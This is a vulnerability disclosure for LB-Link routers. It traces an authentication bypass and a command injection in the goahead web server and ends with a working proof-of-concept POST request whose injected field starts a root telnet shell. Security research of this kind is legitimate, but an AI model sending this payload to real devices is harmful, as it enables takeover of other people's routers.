# Information

**Vendor of the products:** Shenzhen Bilian Electronic Limited Co., Ltd（LB-Link）

**Vendor's website:** [必联（LB-LINK）官方网站](https://www.b-link.net.cn/)

**Reported by:** Wang JinShuai(3265296623@qq.com)，Tang BingCheng(2640807724@qq.com)

**Affected products:** BL-AC2100 \ BL-WR4000 \ BL-WR9000 \ BL-AC1900 \ BL-X26 \ BL-LTE300

**Affected firmware version:**   BL-AC2100_AZ3 V1.0.4 \ BL-WR4000 v2.5.0 \ BL-WR9000_AE4 v2.4.9 \ BL-AC1900_AZ2 v1.0.2 \ BL-X26_AC8 v1.2.8 \ BL-LTE300_DA4 V1.2.3

**Firmware download address:** [下载中心_必联（LB-LINK）官方网站](https://www.b-link.net.cn/downloads_16.html)

# Overview

The LB-Link routers, including the BL-AC2100_AZ3 V1.0.4, BL-WR4000 v2.5.0, BL-WR9000_AE4 v2.4.9, BL-AC1900_AZ2 v1.0.2, BL-X26_AC8 v1.2.8, and BL-LTE300_DA4 V1.2.3 models, are vulnerable to unauthorized command injection. Attackers can exploit this vulnerability by accessing the /goform/set_serial_cfg interface to gain the highest level of device privileges without authorization, enabling them to remotely execute malicious commands.

# Vulnerability details

By analyzing the binary file `/bin/goahead` of the network device that provides web services, an unauthorized command injection vulnerability was discovered. In the authentication function `websSecurityHandler`, when the URL prefix is `/goform/set_`, the function directly returns 0, allowing unauthorized access whenever the URL prefix is `/goform/set_`.

![image-20250812200309308](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122007677.png)

Further analysis of the libc library `libshare-0.0.26.so` revealed a command injection vulnerability in the `bs_SetSerial` function.

The `bs_SetSerial` function is invoked within the `set_serial_cfg` function in the `/bin/goahead` file.

![image-20250812200319638](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122007347.png)

In the function corresponding to `set_serial_cfg`, the values of user input fields, such as `domain`, are directly passed to the `bs_SetSerial` function through a structure.

![image-20250812195846287](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508121958456.png) 

![image-20250812195910872](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508121959918.png)In the `bs_SetSerial` function, the values of user input fields, such as `domain`, are assigned to `v14`, then through `snprintf`, they are assigned to the variable `v34`, which is eventually passed to the `bl_do_system` function.

![image-20250812200123556](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122007161.png) 

!![image-20250812200141675](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122007195.png) 

![image-20250812200340860](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122007334.png) 

The final `bl_do_system` function passes the parameters to the `system` function. Since there is no strict parameter validation during the transfer of user-supplied content, an attacker can construct a system command using backticks, such as `telnetd -l /bin/sh -p 1234`, to start the router's `telnetd` service. This allows the attacker to gain the highest level of device privileges and execute arbitrary commands.

![image-20250812200353408](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122007541.png)

# POC

```
POST /goform/set_serial_cfg HTTP/1.1
Host: 192.168.16.1
Content-Length: 79
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://192.168.16.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.16.1/login.asp
Accept-Encoding: gzip, deflate, br
Cookie: platform=0
Connection: keep-alive

type=setserialinfo&ser_status=1&network=UDP&domain=`telnetd -l /bin/sh -p 1234`
```

# Effect Demonstration

![image-20250812200520027](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122006512.png)

![image-20250812200532135](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122006613.png)

![image-20250812200546078](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508122007427.png)
